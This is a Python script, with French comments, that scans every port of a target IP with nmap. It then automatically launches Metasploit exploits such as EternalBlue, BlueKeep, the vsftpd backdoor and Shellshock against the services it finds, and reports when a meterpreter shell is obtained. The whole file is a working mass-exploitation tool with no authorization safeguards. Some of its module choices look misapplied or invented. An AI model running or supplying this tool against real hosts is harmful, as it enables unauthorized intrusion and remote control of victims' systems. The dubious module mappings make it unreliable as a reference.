import nmap
import subprocess
import sys


# Fonction pour scanner les ports et services d'une cible donnée
def scan_ports(target):
    nm = nmap.PortScanner()
    nm.scan(target, "1-65535", "-sV -T4")
    results = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                service = nm[host][proto][port]["name"]
                results.append((host, port, service))
    return results


# Fonction pour exploiter une vulnérabilité
def exploit_vulnerability(target, port, service, report_file):
    exploit_command = None
    if service == "ftp":
        # Exploit pour vsftpd 2.3.4
        exploit_command = f"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "http" or service == "https":
        # Exemple d'exploit pour un serveur HTTP Apache
        exploit_command = f"use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "smb":
        # Exploit pour Windows SMB (EternalBlue)
        exploit_command = f"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "ssh":
        # Exemple d'exploit pour un serveur SSH
        exploit_command = f"use exploit/linux/ssh/sshexec\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "mysql":
        # Exemple d'exploit pour un serveur MySQL
        exploit_command = f"use auxiliary/scanner/mysql/mysql_login\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "mssql":
        # Exemple d'exploit pour un serveur MSSQL
        exploit_command = f"use exploit/windows/mssql/ms09_004_sp_replwritetovarbin\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "rdp":
        # Exemple d'exploit pour un serveur RDP
        exploit_command = f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "python":
        # Exemple d'exploit pour un serveur Python
        exploit_command = f"use exploit/multi/http/pyhttpd_sqli\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    else:
        with open(report_file, "a") as f:
            f.write(f"No known exploit for service: {service} on port {port}\n")
        print(f"No known exploit for service: {service} on port {port}")
        return False

    if exploit_command:
        result = subprocess.run(
            ["msfconsole", "-q", "-x", exploit_command], capture_output=True, text=True
        )
        with open(report_file, "a") as f:
            f.write(result.stdout)
        if "meterpreter session" in result.stdout:
            print(f"Successfully exploited {target} on port {port}. Shell obtained.")
        else:
            print(f"Failed to exploit {target} on port {port}.")
        return True
    else:
        print(f"No known exploit for service: {service} on port {port}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit_vulns.py <target_ip>")
        sys.exit(1)

    # Adresse IP de la cible passée en argument
    target_ip = sys.argv[1]

    # Fichier de rapport
    report_file = "scan_exploit_report.txt"

    # Effacer le contenu du fichier de rapport s'il existe déjà
    open(report_file, "w").close()

    # Étape 1 : Scanner les ports et services
    ports_services = scan_ports(target_ip)
    with open(report_file, "a") as f:
        f.write(f"Ports and services:\n{ports_services}\n\n")

    print(f"Ports and services: {ports_services}")

    # Étape 2 : Exploiter les vulnérabilités identifiées
    for host, port, service in ports_services:
        if not exploit_vulnerability(host, port, service, report_file):
            with open(report_file, "a") as f:
                f.write(
                    f"Protocol {service} on port {port} is not vulnerable or exploitable.\n"
                )
            print(
                f"Protocol {service} on port {port} is not vulnerable or exploitable."
            )
